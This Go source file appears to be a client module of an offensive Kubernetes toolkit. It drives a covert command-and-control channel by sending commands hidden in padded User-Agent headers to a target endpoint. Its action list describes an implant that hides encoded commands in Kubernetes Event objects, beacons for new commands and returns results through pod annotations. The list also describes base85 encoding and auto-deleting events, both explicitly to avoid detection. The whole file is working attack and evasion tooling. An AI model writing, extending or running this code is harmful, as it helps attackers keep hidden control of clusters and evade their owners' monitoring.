package k8s_event_c2

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type EventC2Result struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, namespace, beaconInterval, output string) error {
	result := &EventC2Result{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"create_event_channel",
			"create Kubernetes Event objects with encoded C2 commands in message field",
			"k8s_c2_create_event",
		},
		{
			"configure_beacon",
			"set beacon interval for periodic command polling via Event watch API",
			"k8s_c2_set_beacon",
		},
		{
			"encode_commands",
			"encode C2 commands using base85 in Event annotations to avoid detection",
			"k8s_c2_encode_cmd",
		},
		{
			"decode_responses",
			"read pod status annotations for encoded command execution results",
			"k8s_c2_decode_resp",
		},
		{
			"cleanup_events",
			"auto-delete old Event objects to prevent accumulation and detection",
			"k8s_c2_cleanup",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + namespace + "#" + beaconInterval
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/k8s_event_c2", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
